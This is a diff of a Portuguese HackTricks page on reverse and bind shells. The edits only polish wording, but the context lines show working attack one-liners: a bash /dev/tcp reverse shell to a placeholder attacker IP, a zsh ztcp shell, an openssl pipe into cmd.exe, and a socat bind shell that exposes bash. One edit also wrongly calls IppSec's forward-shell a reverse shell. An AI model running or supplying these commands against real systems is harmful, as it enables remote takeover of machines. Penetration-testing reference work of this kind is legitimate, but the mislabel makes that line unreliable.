@@ -2,7 +2,7 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**Se você tiver dúvidas sobre qualquer uma dessas shells, você pode verificá-las em** [**https://explainshell.com/**](https://explainshell.com)
+**Se você tiver perguntas sobre qualquer uma dessas shells, você pode verificá-las em** [**https://explainshell.com/**](https://explainshell.com)
 
 ## Full TTY
 
@@ -23,7 +23,7 @@ exec >&0
 ```
 Não se esqueça de verificar com outros shells: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh e bash.
 
-### Shell seguro de símbolo
+### Shell seguro de símbolos
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -81,7 +81,7 @@ toboggan -m nix.py -i
 ```
 Para aproveitar diretamente um shell interativo. Você pode adicionar `-b` para integração com o Burpsuite e remover o `-i` para um wrapper rce mais básico.
 
-Outra possibilidade consiste em usar a implementação de shell forward do `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
+Outra possibilidade consiste em usar a implementação de shell reverso `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
 Você só precisa modificar:
 
@@ -226,7 +226,7 @@ zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPL
 ```
 ## Rustcat (rcat)
 
-[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – listener moderno semelhante ao netcat escrito em Rust (empacotado no Kali desde 2024).
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – listener moderno semelhante ao netcat escrito em Rust (disponível no Kali desde 2024).
 ```bash
 # Attacker – interactive TLS listener with history & tab-completion
 rcat listen -ib 55600
@@ -281,7 +281,7 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-### Shell de ligação
+### Shell de bind
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
